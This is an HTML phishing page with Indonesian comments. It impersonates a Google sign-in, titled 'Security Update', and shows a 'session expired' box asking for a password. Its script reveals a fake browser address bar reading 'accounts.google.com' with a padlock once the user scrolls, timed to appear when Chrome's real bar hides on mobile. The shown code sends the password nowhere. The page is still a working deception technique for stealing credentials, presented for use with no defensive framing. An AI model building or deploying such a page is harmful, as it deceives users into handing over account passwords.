<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Update</title>
    <style>
        body { margin: 0; padding: 0; font-family: sans-serif; height: 200vh; background: #f1f3f4; }
        
        /* BAR ALAMAT PALSU - Muncul saat user scroll */
        .fake-address-bar {
            position: fixed; top: 0; width: 100%; height: 56px;
            background: #ffffff; display: flex; align-items: center;
            padding: 0 15px; border-bottom: 1px solid #dadce0;
            box-sizing: border-box; z-index: 9999;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .url-text { color: #202124; font-size: 14px; margin-left: 10px; flex-grow: 1; }
        
        .content { padding: 80px 20px; text-align: center; }
        .login-box { background: white; padding: 20px; border-radius: 8px; border: 1px solid #ddd; }
    </style>
</head>
<body>

    <div class="fake-address-bar" id="fakeBar">
        <span>🔒</span>
        <div class="url-text">accounts.google.com/signin/v2/</div>
        <span>⋮</span>
    </div>

    <div class="content">
        <div class="login-box">
            <h2>Sesi Berakhir</h2>
            <p>Silakan login kembali untuk melanjutkan.</p>
            <input type="password" placeholder="Password Anda" style="width: 100%; padding: 10px; margin-bottom: 10px;">
            <button style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 4px;">Login</button>
        </div>
        <p style="margin-top: 500px;">Scroll terus ke bawah...</p>
    </div>

    <script>
        // Sembunyikan/Munculkan bar palsu berdasarkan scroll
        window.onscroll = function() {
            let fakeBar = document.getElementById('fakeBar');
            if (window.pageYOffset > 50) {
                fakeBar.style.display = "flex"; // Muncul saat bar asli Chrome ngumpet
            } else {
                fakeBar.style.display = "none";
            }
        };
    </script>
</body>
</html>
